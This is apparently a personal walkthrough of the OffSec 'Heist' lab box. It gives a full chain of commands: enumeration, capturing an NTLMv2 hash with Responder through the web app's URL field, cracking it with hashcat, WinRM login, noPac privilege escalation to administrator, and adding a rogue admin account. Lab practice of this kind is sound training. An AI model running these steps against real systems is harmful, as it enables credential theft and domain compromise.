# NMAP 

```
sudo nmap -sC -sV 192.168.120.165 -oN nmap-heist
```

![[PG/Active Directory/attachments/Pasted image 20250707211724.png]]
- domain: heist.offsec -> add to /etc/hosts

# SMB 

![[PG/Active Directory/attachments/Pasted image 20250707211944.png]]
- nope but: dc01.heist.offsec -> add to /etc/hosts

![[PG/Active Directory/attachments/Pasted image 20250707212124.png]]
- nope 

# RPC 

```
rpcclient -U '' -N 192.168.120.165
```

![[PG/Active Directory/attachments/Pasted image 20250707212248.png]]
- nope

# Web (Port 8080)

![[PG/Active Directory/attachments/Pasted image 20250707212425.png]]
- looks the same with domain name 

## Ferox 

```
feroxbuster -u http://192.168.120.165:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```


Entered 127.0.0.1 in search and got this error

![[PG/Active Directory/attachments/Pasted image 20250707212713.png]]
- Galactic Web Service of Sagittarius V4641?
- May be jokes from the dev of The E.N.D or Gitmicks


Trying my IP naturally 

![[PG/Active Directory/attachments/Pasted image 20250707213103.png]]
- weird flash of something 

No hits 
![[PG/Active Directory/attachments/Pasted image 20250707213135.png]]

Added http and I did get a hit 

![[PG/Active Directory/attachments/Pasted image 20250707213209.png]]

![[PG/Active Directory/attachments/Pasted image 20250707213226.png]]

Random topic goes to localhost I guess
![[PG/Active Directory/attachments/Pasted image 20250707213350.png]]

Soooo I thought about trying responder 

```
sudo responder -I tun1 
```

Then I entered `http://192.168.45.152/445/`

It looks like I did actually get a usable hash...

![[PG/Active Directory/attachments/Pasted image 20250707214620.png]]

Noiiice

Save this NTLMv2 hash to a file for the 'enox' user 

Mode: 5600 for NetNTLMv2

```
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt --force
```

It cracked to `california`

![[PG/Active Directory/attachments/Pasted image 20250707214927.png]]

So creds are `enox:california`

These are valid :) 

![[PG/Active Directory/attachments/Pasted image 20250707215135.png]]

```
heist.offsec\enox:california 
```

Yayayay looks like these work with winrm 

```
nxc winrm 192.168.120.165 -u 'enox' -p 'california' 
```

![[PG/Active Directory/attachments/Pasted image 20250707215318.png]]

# Login with Evil-WinRM

```
evil-winrm -i 192.168.120.165 -u 'enox' -p 'california'
```

Grab user flag 

![[PG/Active Directory/attachments/Pasted image 20250707215441.png]]

Checking out these user notes 

![[PG/Active Directory/attachments/Pasted image 20250707215630.png]]
- Flask App for Secure Browser
- managed service account for apache

Looks like the Flask application is still in here 

![[PG/Active Directory/attachments/Pasted image 20250707215740.png]]

Before going too far into this rabbit hole... let's do some more enum. 

Whoami 

![[PG/Active Directory/attachments/Pasted image 20250707215937.png]]

Is SeMachineAccountPrivilege exploitable?

![[PG/Active Directory/attachments/Pasted image 20250707220122.png]]
- okay, go off google. 
- maybe this is tthe path

Here are some basic steps 

![[PG/Active Directory/attachments/Pasted image 20250707220204.png]]

I think I can add a new account with PowerMad and this Repo may cover the SamAccount spoofing 

https://www.hackingarticles.in/windows-privilege-escalation-samaccountname-spoofing/

https://github.com/Ridter/noPac

Worth a shot...

# Priv Esc by Exploiting SeMachineAccountPrivilege

```
python3 noPac.py heist.offsec/enox:'california' -dc-ip 192.168.120.165 -shell --impersonate administrator -use-ldap
```


![[PG/Active Directory/attachments/Pasted image 20250707221051.png]]

This worked! lol

I can't change directories to get the flag though....

![[PG/Active Directory/attachments/Pasted image 20250707221413.png]]

Add a new administrative user

```
net user [username] [password] /add
```

```
net localgroup administrators [username] /add
```

![[PG/Active Directory/attachments/Pasted image 20250707221642.png]]

Test access with new admin user with nxc 

```
nxc smb 192.168.120.165 -u 'cadet' -p 'Password1!'
```
![[PG/Active Directory/attachments/Pasted image 20250707221809.png]]

Loginnnnnn

```
impacket-psexec 
```
- didn't work 

![[PG/Active Directory/attachments/Pasted image 20250707222327.png]]

# Tested WinRM and Evil-WinRM worked

![[PG/Active Directory/attachments/Pasted image 20250707222406.png]]

## Login as my new admin user with Evil-WinRM

```
evil-winrm -i 192.168.120.165 -u 'cadet' -p 'Password1!'
```

![[PG/Active Directory/attachments/Pasted image 20250707222504.png]]

Go git admin flag

![[PG/Active Directory/attachments/Pasted image 20250707222203.png]]

That's definitely the fastest I've ever pwned a box. TY Ippsec.

Got system.

